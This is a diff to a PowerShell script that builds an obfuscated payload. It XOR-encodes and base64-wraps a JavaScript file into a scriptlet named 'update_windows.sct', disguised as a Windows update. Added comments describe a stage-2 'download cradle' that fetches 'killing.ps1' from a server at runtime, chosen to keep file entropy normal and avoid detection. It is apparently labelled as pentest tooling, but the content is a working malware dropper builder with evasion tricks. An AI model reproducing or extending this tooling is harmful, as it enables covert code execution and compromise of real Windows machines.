@@ -5,7 +5,13 @@ $OUT = 'update_windows.sct'
 
 # --- 1) XOR + base64 ---
 $key = [Text.Encoding]::UTF8.GetBytes($KEY)
-$js  = [IO.File]::ReadAllBytes($SRC)
+$jsText = [IO.File]::ReadAllText((Join-Path $PSScriptRoot $SRC))
+
+# --- 1b) stage 2 handoff is now DOWNLOAD-CRADLE (pentest.js fetches killing.ps1
+#     from the HTTP server at runtime) — nothing embedded, keeps .js entropy normal.
+#     The obfuscated stub to serve is still built by stage2/build.ps1 -> killing_obf.ps1.
+
+$js  = [Text.Encoding]::UTF8.GetBytes($jsText)
 $enc = New-Object byte[] $js.Length
 for ($i=0; $i -lt $js.Length; $i++) {
     $enc[$i] = $js[$i] -bxor $key[$i % $key.Length]
@@ -102,7 +108,7 @@ window.onload = function () {
 '@
 
 $template = $template.Replace('__BLOB__', $b64).Replace('__KB__', $kb)
-[IO.File]::WriteAllText((Join-Path (Get-Location) $OUT), $template, [Text.Encoding]::UTF8)
+[IO.File]::WriteAllText((Join-Path $PSScriptRoot $OUT), $template, [Text.Encoding]::UTF8)
 
 Write-Host "[+] Wrote $OUT"
 Write-Host "    blob len : $($b64.Length)"
